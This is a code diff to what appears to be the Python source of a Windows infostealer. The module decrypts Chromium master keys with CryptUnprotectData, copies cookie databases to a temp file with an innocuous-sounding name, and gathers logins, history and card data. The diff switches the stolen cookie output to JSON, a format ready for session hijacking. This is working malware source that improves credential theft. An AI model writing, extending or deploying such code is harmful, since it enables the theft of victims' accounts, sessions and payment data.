@@ -2,7 +2,7 @@ from os import remove,environ, makedirs, getenv
 from os.path import join, exists, dirname
 from glob import glob
 from base64 import b64decode
-from json import loads
+import json
 from win32crypt import CryptUnprotectData
 from manager.logger import Log
 from shutil import copy2
@@ -12,7 +12,7 @@ from datetime import datetime, timedelta
 from preferences.config import config
 
 logins = ''''''
-cookies = ''''''
+cookies = []
 history = ''''''
 downhistory = ''''''
 cards = ''''''
@@ -30,6 +30,17 @@ class Types:
 
         def __str__(self):
             return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'
+
+        def to_dict(self):
+            return {
+                "domain": self.host,
+                "name": self.name,
+                "value": self.value,
+                "path": self.path,
+                "expires": self.expires,
+                "httpOnly": not self.expires == 0,
+                "secure": not self.host.startswith(".")
+            }
     
     class Login:
         def __init__(self, url, username, password):
@@ -90,7 +101,7 @@ def get_master_key(path: str):
         c = f.read()
     if 'os_crypt' not in c:
         return None
-    local_state = loads(c)
+    local_state = json.loads(c)
     master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]
     master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
@@ -197,13 +208,13 @@ def get_cookies(path, master_key, blink = False):
         copy2(cookie_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\cwincache.db')
         conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
         cursor = conn.cursor()
-        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
+        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies ORDER BY host_key ASC")
         for row in cursor.fetchall():
             if not all(row[:4]): continue
 
             cookie_value = decrypt_password(row[3], master_key)
             cookie_line = Types.Cookie(row[0], row[1], row[2], cookie_value, row[4])
-            cookies += str(cookie_line) + "\n"
+            cookies.append(cookie_line.to_dict())
         
         conn.close()
         try: remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
@@ -297,7 +308,7 @@ def Write(pathToLogs, browser):
     
     if (cookies):
         with open(rf"{pathToLogs}\\{browser}\\cookies.txt", "w", encoding="utf-8") as f:
-            f.write(cookies)
+            f.write(json.dumps(cookies, indent=2))
         msgInfo+="\n∟🍪cookies"
     
     if (autofills):
